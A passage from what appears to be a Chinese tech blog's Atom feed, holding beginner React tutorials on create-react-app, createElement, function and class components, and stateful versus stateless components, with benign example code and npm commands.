    <content type="html"><![CDATA[<h2 id="React介绍"><a href="#React介绍" class="headerlink" title="React介绍"></a>React介绍</h2><blockquote><p>了解 react 的历史背景和基本概念</p></blockquote><p><a href="https://reactjs.org/" target="_blank" rel="noopener">React</a> 起源于 Facebook 的内部项目。因为该公司对市场上所有 JavaScript <a href="https://so.csdn.net/so/search?q=MVC&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener">MVC</a> 框架，都不满意，就决定自己写一套，用来架设 Instagram 的网站。做出来以后，发现这套东西很好用，就在 2013 年 5 月开源了。</p><p>React 是最流行的前端<a href="https://so.csdn.net/so/search?q=框架&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener">框架</a>之一。对比近两年 <a href="https://npm-stat.com/charts.html?package=angular&amp;package=react&amp;package=vue&amp;from=2019-10-01&amp;to=2021-09-30" target="_blank" rel="noopener">Vue 和 Angular</a> 的下载量，还有 2021 年开发者使用的 web 框架的 <a href="https://insights.stackoverflow.com/survey/2021#most-popular-technologies-webframe" target="_blank" rel="noopener">比例</a> ，可以看到 React 是前端工程师应该必备技能之一，现在很多大厂也在使用它。</p><p><img src="https://oss.iyouhun.com/img/md/QQ20220607-134043@2x.png" alt="QQ20220607-134043@2x"></p><p>React 是一个用于构建用户界面的 JavaScript 库。可以理解它只负责 MVC 中的视图层渲染，不直接提供数据模型和控制器功能。react-router 实现路由，redux 实现状态管理，可以使用它们来构建一个完整应用。</p><p>React 中文站：<a href="https://zh-hans.reactjs.org/" target="_blank" rel="noopener">React 官方中文文档 – 用于构建用户界面的 JavaScript 库</a></p><p><strong>总结：</strong> React 是 Facebook 开源的，现在它是最流行的前端框架大厂必备，React 本身是一个构建 UI 的库，如果需要开发一个完整的 web 应用需要配合 react-router，redux，…等。</p><h2 id="React特点"><a href="#React特点" class="headerlink" title="React特点"></a>React特点</h2><blockquote><p>了解 react 的三个核心特点</p></blockquote><h3 id="1-声明式"><a href="#1-声明式" class="headerlink" title="(1)声明式"></a>(1)声明式</h3><p>React 使创建交互式 UI 变得轻而易举。为你应用的每一个状态设计简洁的视图，当数据变动时 React 能高效更新并渲染合适的组件。</p><p>以声明式编写 UI，可以让你的代码更加可靠，且方便调试。</p><p><img src="https://oss.iyouhun.com/img/md/image-20220607141033348.png" alt="image-20220607141033348"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220607141042978.png" alt="image-20220607141042978"></p><h3 id="2-组件化"><a href="#2-组件化" class="headerlink" title="(2)组件化"></a>(2)组件化</h3><p>创建拥有各自状态的组件，再由这些组件构成更加复杂的 UI。 组件逻辑使用 JavaScript 编写而非模版，因此你可以轻松地在应用中传递数据，并使得状态与 DOM 分离。</p><p><img src="https://oss.iyouhun.com/img/md/1633579096420.db143907.png" alt="1633579096420.db143907"></p><h3 id="3-一次学习，跨平台编写"><a href="#3-一次学习，跨平台编写" class="headerlink" title="(3)一次学习，跨平台编写"></a>(3)一次学习，跨平台编写</h3><p>无论你现在使用什么技术栈，在无需重写现有代码的前提下，通过引入 React 来开发新功能。React 还可以使用 Node 进行服务器渲染，或使用 <a href="https://reactnative.dev/" target="_blank" rel="noopener">React Native</a> 开发原生移动应用。</p><p><img src="https://oss.iyouhun.com/img/md/1633578566552.7b549f39.png" alt="1633578566552.7b549f39"></p><p><strong>总结：</strong> 声明式 UI 更清晰快捷，组件化开发更灵活，可支持 SSR,SPA ,NativeApp,VR 多平台。</p><h2 id="React-脚手架"><a href="#React-脚手架" class="headerlink" title="React 脚手架"></a>React 脚手架</h2><blockquote><p>掌握使用 create-react-app 脚手架创建项目</p></blockquote><p>创建项目方式：</p><ul><li>全局安装脚手架再使用命令创建项目</li><li>使用 npx 远程调用脚手架创建项目</li></ul><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><ul><li>全局安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 全局安装脚手架</span></span><br><span class="line">npm i create-react-app -g</span><br></pre></td></tr></table></figure><ul><li>创建项目</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> project-name 项目名称</span></span><br><span class="line">create-react-app project-name</span><br></pre></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><ul><li>npx 安装，npm5.2+支持</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> project-name 项目名称</span></span><br><span class="line">npx create-react-app project-name</span><br></pre></td></tr></table></figure><p> <strong>推荐：</strong> 使用<strong>方式二</strong>这样每次使用的最新脚手架创建项目，创建完毕使用 <code>npm start</code> 启动项目。</p><h2 id="React-基本使用"><a href="#React-基本使用" class="headerlink" title="React 基本使用"></a>React 基本使用</h2><blockquote><p>在 create-react-app 脚手架创建项目中，掌握使用 react 基本步骤</p></blockquote><p>使用步骤：</p><ul><li>导入 <code>react</code>、<code>react-dom</code> 两个包</li><li>使用 <code>react</code> 创建 react 元素（虚拟 DOM）</li><li>使用 <code>react-dom</code> 渲染 react 元素</li></ul><p>落地代码：src 内文件删除，创建<code>src/index.js</code></p><ul><li>导包</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 负责创建react元素</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 负责把react元素渲染到页面</span></span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br></pre></td></tr></table></figure><ul><li>创建 react 元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数1：标签名称</span></span><br><span class="line"><span class="comment">// 参数2：属性集合  特殊 class==&gt;className for==&gt;htmlFor</span></span><br><span class="line"><span class="comment">// 参数3：标签内容</span></span><br><span class="line"><span class="keyword">const</span> element = React.createElement(<span class="string">'h1'</span>, &#123; <span class="attr">id</span>: <span class="string">'el'</span> &#125;, <span class="string">'Hello React'</span>);</span><br></pre></td></tr></table></figure><ul><li>渲染 react 元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #root在public/index.html上</span></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p> <strong>总结：</strong> 使用 <code>react</code> 创建元素，使用 <code>react-dom</code> 渲染元素。</p><h2 id="React-创建元素练习"><a href="#React-创建元素练习" class="headerlink" title="React 创建元素练习"></a>React 创建元素练习</h2><blockquote><p>掌握使用 react 创建嵌套元素</p></blockquote><p>使用 react 创建如下元素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>水果<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>橘子<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>React代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> element = React.createElement(<span class="string">'div'</span>, &#123; <span class="attr">className</span>: <span class="string">'list'</span> &#125;, [</span><br><span class="line">  React.createElement(<span class="string">'h1'</span>, <span class="literal">null</span>, <span class="string">'水果'</span>),</span><br><span class="line">  React.createElement(<span class="string">'ul'</span>, <span class="literal">null</span>, [</span><br><span class="line">    React.createElement(<span class="string">'li'</span>, <span class="literal">null</span>, <span class="string">'苹果'</span>),</span><br><span class="line">    React.createElement(<span class="string">'li'</span>, <span class="literal">null</span>, <span class="string">'橘子'</span>),</span><br><span class="line">  ]),</span><br><span class="line">]);</span><br><span class="line"> </span><br><span class="line">ReactDOM.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p><strong>总结：</strong> 使用 <code>createElement</code> 创建元素非常麻烦、可读性差、不优雅，开发中推荐使用 JSX 来声明 UI。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;React介绍&quot;&gt;&lt;a href=&quot;#React介绍&quot; class=&quot;headerlink&quot; title=&quot;React介绍&quot;&gt;&lt;/a&gt;React介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;了解 react 的历史背景和基本概念&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React快速上手" scheme="//www.shen.ee/tags/React%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
    
      <category term="React入门" scheme="//www.shen.ee/tags/React%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>React组件基础</title>
    <link href="//www.shen.ee/article/9550.html"/>
    <id>//www.shen.ee/article/9550.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="React-组件介绍"><a href="#React-组件介绍" class="headerlink" title="React 组件介绍"></a>React 组件介绍</h2><p>组件允许你将 UI 拆分为<strong>独立可复用</strong>的代码片段，并对每个片段进行独立构思。</p><p>组件表示页面中的部分功能，组合多个组件实现完整的页面。</p><p><strong>功能特点</strong>：可复用、独立、可组合。</p><h2 id="React组件的两种创建方式"><a href="#React组件的两种创建方式" class="headerlink" title="React组件的两种创建方式"></a>React组件的两种创建方式</h2><p><strong>React 创建组件方法：</strong></p><ol><li>使用函数 <strong><code>function</code></strong></li><li>使用类 <strong><code>class</code></strong></li></ol><h3 id="函数组件"><a href="#函数组件" class="headerlink" title="函数组件"></a>函数组件</h3><h4 id="1）什么是函数组件？"><a href="#1）什么是函数组件？" class="headerlink" title="1）什么是函数组件？"></a>1）什么是函数组件？</h4><ul><li>使用 JS 函数（普通，箭头）创建的组件。</li></ul><h4 id="2）定义函数组件"><a href="#2）定义函数组件" class="headerlink" title="2）定义函数组件"></a>2）定义函数组件</h4><ul><li>语法约定<ul><li>函数名称<code>首字母必需大写</code>，React 据此来区分组件和 HTML 元素。</li><li>函数<code>必须有返回值</code>，表示该组件的 UI 结构，如果不渲染任何内容可返回<code>null</code>。</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Header</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> Footer = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>底部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不渲染内容</span></span><br><span class="line"><span class="keyword">const</span> Loading = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> loading = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> loading ? <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>正在加载...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> : <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="3）使用组件"><a href="#3）使用组件" class="headerlink" title="3）使用组件"></a>3）使用组件</h4><ul><li>函数的名称就是组件名称，使用组件就是把组件名称当标签使用即可。</li><li>组件标签可以是单标签也可以是双标签。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Header</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> Footer = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>底部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载组件，不渲染内容</span></span><br><span class="line"><span class="keyword">const</span> Loading = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> loading = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> loading ? <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>正在加载...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> : <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根组件</span></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;Header /&gt;</span><br><span class="line">      &lt;Loading /&gt;</span><br><span class="line">      &lt;Footer /&gt;</span><br><span class="line">    &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>创建函数组件，首字母大写，需要返回值，不渲染就返回 <code>null</code>。</li><li>使用函数组件，组件名称当作标签使用即可。</li></ul><h3 id="类组件"><a href="#类组件" class="headerlink" title="类组件"></a>类组件</h3><h4 id="class-语法"><a href="#class-语法" class="headerlink" title="class 语法"></a>class 语法</h4><p>复习一下定义class、定义属性、定义函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 动物</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  address = <span class="string">'地球'</span>;</span><br><span class="line">  eat() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'吃'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>extends</code> 继承父类</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 猫</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  run() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'跑'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> Cat();</span><br><span class="line">cat.run(); <span class="comment">// 跑</span></span><br><span class="line">cat.eat(); <span class="comment">// 吃</span></span><br><span class="line"><span class="built_in">console</span>.log(cat.address); <span class="comment">// 地球</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong> <code>class</code>创建类，<code>extends</code>继承类，可以使用父类的属性和函数。</p><h4 id="1）什么是类组件？"><a href="#1）什么是类组件？" class="headerlink" title="1）什么是类组件？"></a>1）什么是类组件？</h4><ul><li>使用<strong><code>class</code></strong>语法创建的组件就是类组件</li></ul><h4 id="2）定义类组件"><a href="#2）定义类组件" class="headerlink" title="2）定义类组件"></a>2）定义类组件</h4><ul><li>约定：类名首字母必需大写</li><li>约定：必须继承<strong><code>React.Component</code></strong>父类</li><li>约定：必需有<strong><code>render</code></strong>函数，返回 UI 结构，无渲染可返回 null</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3）使用类组件"><a href="#3）使用类组件" class="headerlink" title="3）使用类组件"></a>3）使用类组件</h4><ul><li>类名称就是组件名称，使用组件就是把组件名称当标签使用即可。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 头部</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 根组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;Header /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">ReactDom.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ul><li>使用<strong><code>class</code></strong>定义类，使用<strong><code>extends</code></strong>继承<strong><code>React.Component</code></strong>完成类组件定义</li><li>类名<code>首字母大写</code>，必须有<code>render</code>函数返回 UI 结构，无渲染可返回<code>null</code></li><li>使用的时候把类名当作<code>标签</code>使用即可</li></ul><h2 id="组件抽离"><a href="#组件抽离" class="headerlink" title="组件抽离"></a>组件抽离</h2><p>如果所有组件写在一个文件，代码写在一起后续会难以维护，组件作为一个独立的个体，一般都会放到一个单独的JS文件中。</p><p><strong>抽离组件</strong> </p><ul><li>定义一个<code>js</code>或者<code>jsx</code>文件定义组件默认导出</li><li>使用组件导入即可，当作标签使用。</li></ul><p><strong>具体操作：</strong> </p><p> 1.新建 <strong><code>src/components/Header.jsx</code></strong> 类组件，新建 <strong><code>src/components/Footer.jsx</code></strong> 函数组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Header;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Footer = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>底部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Footer;</span><br></pre></td></tr></table></figure><p>2.新建 <strong><code>src/App.jsx</code></strong> 组件, 导入<strong><code>Header</code> <code>Footer</code></strong>组件使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> Header <span class="keyword">from</span> <span class="string">'./components/Header.jsx'</span>;</span><br><span class="line"><span class="keyword">import</span> Footer <span class="keyword">from</span> <span class="string">'./components/Footer.jsx'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;Header /&gt;</span><br><span class="line">        内容</span><br><span class="line">        &lt;Footer /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>3.<strong><code>index.js</code></strong> 使用 <strong><code>App</code></strong> 根组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.jsx'</span>;</span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span>, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><h2 id="无状态组件和有状态组件"><a href="#无状态组件和有状态组件" class="headerlink" title="无状态组件和有状态组件"></a>无状态组件和有状态组件</h2><blockquote><p>简单理解：</p><p>无状态(函数)组件，负责静态结构展示</p><p>有状态(类）组件，负责更新UI，让页面动起来</p></blockquote><h3 id="1-无状态组件"><a href="#1-无状态组件" class="headerlink" title="1.无状态组件"></a>1.无状态组件</h3><ul><li>组件本身不定义状态，没有组件生命周期，只负责 UI 渲染。</li><li><code>React16.8</code>之前的函数组件都是无状态组件，<code>Hooks</code> 出现后函数组件也可以有状态。</li></ul><h3 id="2-有状态组件"><a href="#2-有状态组件" class="headerlink" title="2.有状态组件"></a>2.有状态组件</h3><ul><li>组件本身有独立数据，拥有组件生命周期，存在交互行为。</li><li><code>class</code> 组件可以定义组件自己的状态，拥有组件生命周期，它是有状态组件。</li></ul><h3 id="3-它们的区别"><a href="#3-它们的区别" class="headerlink" title="3.它们的区别"></a>3.它们的区别</h3><ul><li>无状态组件由于没有维护状态只做渲染，性能较好。有状态组件提供数据和生命周期，能力更强。</li></ul><h3 id="4-如何去选择"><a href="#4-如何去选择" class="headerlink" title="4.如何去选择"></a>4.如何去选择</h3><ul><li><code>React16.8</code>之前，组件不需要维护数据只渲染就使用<code>函数组件</code>，有数据和交互使用<code>类组件</code>。你需要去判断，有心智负担。</li><li><code>React16.8</code>之后，<code>Hooks</code>出现给函数提供状态，建议使用函数组件即可。</li></ul><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ul><li>组件本身没有状态就是无状态组件，组件本身提供状态就是有状态组件。</li><li>16.8 之前，无状态组件使用函数组件，有状态组件使用类组件。16.8 之后，统一可使用函数组件。</li><li>React 没有说完全取代类组件，老项目中还是类组件居多，我们有必要学习下它的具体用法。</li></ul><h2 id="类组件-定义状态"><a href="#类组件-定义状态" class="headerlink" title="类组件 - 定义状态"></a>类组件 - 定义状态</h2><ul><li>定义<strong><code>state</code></strong>属性定义组件状态，属于组件自己的数据，它的值是个对象。</li><li>使用<strong><code>state</code></strong>的时候通过<strong><code>this</code></strong>去访问即可，例如：<strong><code>this.state.xxx</code>。</strong></li><li>数据发生变化，驱动视图更新。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 